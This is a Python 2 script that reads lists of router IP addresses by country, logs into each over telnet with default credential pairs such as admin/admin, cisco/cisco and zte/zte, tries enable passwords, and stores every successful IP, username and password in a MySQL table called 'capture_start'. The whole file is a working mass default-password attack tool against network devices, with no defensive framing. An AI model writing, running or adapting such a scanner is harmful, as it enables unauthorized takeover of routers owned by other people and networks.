#!/usr/bin/env python
# -*- coding: UTF-8 -*
import telnetlib, sys, time, socket
import db
import MySQLdb
import configparser
import os
mydb = db.connect()
cur = mydb.cursor()
config = configparser.ConfigParser()
config.read('config/routerconfig.ini')
country = config['router']['country']
country = str(country)
filename = config['router']['ip-file-name']
filepath = os.getcwd()+"/ip-files/"+filename
line_break = "\r\n"
exclude_start = ("#", "$") #to identify the lines in txt file that starts with these characters
login_phrase = ["sername:", "ogin:","ser name:"]
password_phrase =["assword:", "ser assword:"]
list1 = ['admin','admin','cisco','cisco','zte','zte','admin','cisco','cisco','admin']
complist = ["cisco","H3C","Microtik","Huawei","ZTE"]
matchString = ["#",">"]
wrongString = ["nvalid","ncorrect","wrong","Bad","error"]
val1="sername:"
val2="ogin:"
val3="ser name:"
pass1="assword:"
pass2="ser assword:"
comp="Unknown"
class TELNET(object):
	"""connect to hosts"""
	def __init__(self):
		self.connections = []
		
	def connect (self, router,userid,password):
		try:
			print router
			connection = telnetlib.Telnet(router,23,20)
			getuser= connection.expect(login_phrase ,15)
			if val1 in getuser[2] or val2 in getuser[2] or val3 in getuser[2]:
				connection.write(userid + line_break)
			else: 
				userid="Null"
			getpass= connection.expect(password_phrase ,15)
			if pass1 in getpass[2] or pass2 in getpass[2]:
				connection.write(password + line_break)
				val = connection.expect(matchString,10)
				res=val[0]
				for i, wString in enumerate(wrongString):
					if wString in val[2]:
						return 0
					elif res == 1:
						l=0
						try:
							for j, com1 in enumerate(list1):
								if l == 4 or l == 0:
									l = 1
									connection.write('en' + line_break)
								connection.expect(password_phrase,15)
								connection.write(com1 + line_break)
								l += 1
								enmatch = ["#"]
								valen = connection.expect(enmatch,10)
								res1 = valen[0]
								for k, wString1 in enumerate(wrongString):
									if wString1 in valen:
										return 0
									elif res1 == 0:
										enpassword = userid
										return 1,router,userid,password,enpassword
						except Exception as e: 
							print(e)
						
		except Exception as e: 
			print(e)
		
	
	def close(self):
		connection.close()


f = open(filepath , "r")
lines =  [n for n in f.readlines() if not n.startswith(exclude_start)]
f.close()
total_connections = len(lines) 
for x in range(0, total_connections):
    globals()['router%s' % x] = (lines[x]).rstrip()
for x in range(0, total_connections):
	try:
		for i in xrange (0,10,2):
			try:	
				telnet = TELNET()
				c,r,u,p,e=telnet.connect(globals()["router"+str(x)],list1[i],list1[i+1])
				print "this is ",r,u,p,e
				if c is not None and c == 1:
					query = """INSERT INTO capture_start (ip,username,password,country,enpass ) VALUES(%s,%s,%s,UPPER(%s),%s)"""
					val = (r,u,p,country,e)
					try:
						cur.execute(query,val)
						mydb.commit()
					except Exception as e:
						print e
					break
				telnet.close()
				
			except Exception as e:
				#print e
				continue
	except Exception as e:
		#print e
		continue
cur.close()


